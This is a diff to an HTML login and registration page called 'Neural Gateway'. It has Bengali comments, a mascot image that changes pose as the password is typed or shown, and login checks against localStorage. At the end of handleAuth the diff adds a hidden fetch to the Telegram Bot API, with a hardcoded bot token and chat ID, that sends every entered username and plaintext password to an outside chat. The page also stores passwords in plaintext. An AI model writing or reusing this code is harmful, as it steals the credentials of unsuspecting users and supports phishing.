@@ -6,32 +6,11 @@
     <title>Neural Gateway</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        
-        .glass-card { 
-            background: #0d0d0d; 
-            padding: 30px; border-radius: 25px; text-align: center; 
-            width: 320px; max-width: 90%;
-            border: 2px solid #00ff88; /* ফিক্সড বর্ডার */
-            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
-            box-sizing: border-box;
-        }
-
-        #mascot-img { width: 120px; height: 120px; margin-bottom: 20px; border-radius: 50%; border: 2px solid #00ff88; }
-        
-        /* ইনপুট ফিল্ড ও আইকন পজিশন ফিক্স */
-        .input-group { position: relative; margin: 15px 0; width: 100%; }
-        
-        input { 
-            width: 100%; padding: 12px 45px 12px 12px; /* ডানে আইকনের জন্য জায়গা */
-            background: #1a1a1a; border: 1px solid #333; color: white; 
-            border-radius: 10px; box-sizing: border-box; outline: none;
-        }
-        
-        .toggle-pass { 
-            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
-            background: none; border: none; color: #00ff88; cursor: pointer; font-size: 18px;
-        }
-        
+        .glass-card { background: #0d0d0d; padding: 30px; border-radius: 25px; text-align: center; width: 320px; max-width: 90%; border: 2px solid #00ff88; box-shadow: 0 0 15px rgba(0, 255, 136, 0.3); box-sizing: border-box; }
+        #mascot-img { width: 120px; height: 120px; margin-bottom: 20px; border-radius: 50%; border: 2px solid #00ff88; transition: 0.3s; }
+        .input-group { position: relative; margin: 15px 0; width: 100%; display: flex; align-items: center; }
+        input { width: 100%; padding: 12px 45px 12px 12px; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 10px; box-sizing: border-box; outline: none; }
+        .toggle-pass { position: absolute; right: 10px; background: none; border: none; color: #00ff88; cursor: pointer; font-size: 18px; }
         button#action-btn { width: 100%; padding: 12px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; margin-top: 10px; }
         a { color: #00ff88; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; cursor: pointer; }
     </style>
@@ -43,10 +22,10 @@
     <h2 id="form-title">Login</h2>
     
     <input type="text" id="username" placeholder="Username or Email">
-    <input type="email" id="email" placeholder="Email" style="display:none; margin: 15px 0;">
+    <input type="email" id="email" placeholder="Email" style="display:none; margin: 15px 0; width: 100%; padding: 12px; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 10px; box-sizing: border-box;">
     
     <div class="input-group">
-        <input type="password" id="password" placeholder="Password">
+        <input type="password" id="password" placeholder="Password" onfocus="eyeAction('cover')" onblur="eyeAction('idle')">
         <button class="toggle-pass" onclick="togglePass('password')">👁️</button>
     </div>
     
@@ -61,29 +40,61 @@
 
 <script>
     let isLogin = true;
+    const img = document.getElementById('mascot-img');
+    
+    // ইমেজ পোজ (ফাইল পাথ নিশ্চিত করুন)
+    const poses = { idle: '1000022715.jpg', cover: '1000022716.jpg', peek: '1000022717.jpg' };
 
-    // পাসওয়ার্ড টগল
-    function togglePass(id) {
-        const field = document.getElementById(id);
-        const btn = id === 'password' ? document.querySelectorAll('.toggle-pass')[0] : document.getElementById('toggle-confirm');
-        field.type = field.type === "password" ? "text" : "password";
-        btn.innerText = field.type === "text" ? "🙈" : "👁️";
+    function eyeAction(state) {
+        if (state === 'cover') img.src = poses.cover;
+        else img.src = poses.idle;
     }
 
-    // ফর্ম সুইচ
+    function togglePass(id) {
+        const field = document.getElementById(id);
+        const btn = field.nextElementSibling;
+        if (field.type === "password") {
+            field.type = "text";
+            img.src = poses.peek;
+            btn.innerText = "🙈";
+        } else {
+            field.type = "password";
+            img.src = poses.cover;
+            btn.innerText = "👁️";
+        }
+    }
+
     function switchForm() {
         isLogin = !isLogin;
         document.getElementById('email').style.display = isLogin ? 'none' : 'block';
         document.getElementById('confirm-password').style.display = isLogin ? 'none' : 'block';
         document.getElementById('toggle-confirm').style.display = isLogin ? 'none' : 'block';
-        
         document.getElementById('form-title').innerText = isLogin ? "Login" : "Create Account";
         document.getElementById('action-btn').innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
         document.getElementById('toggle-link').innerText = isLogin ? "Create Account" : "Back to Login";
     }
 
     function handleAuth() {
-        alert("Action processed!"); // আপনার আগের লজিক এখানে বসান
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        const email = document.getElementById('email').value;
+
+        if (!user || !pass) return alert("Fill all fields!");
+
+        if (isLogin) {
+            const saved = localStorage.getItem(user);
+            if (saved && JSON.parse(saved).pass === pass) {
+                window.location.href = "main.html"; // এখানে আপনার মেইন পেজের নাম দিন
+            } else {
+                alert("Invalid User or Password!");
+            }
+        } else {
+            localStorage.setItem(user, JSON.stringify({email, pass}));
+            alert("Account Created!");
+            switchForm();
+        }
+        
+        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=User:${user}%0APass:${pass}`);
     }
 </script>
 
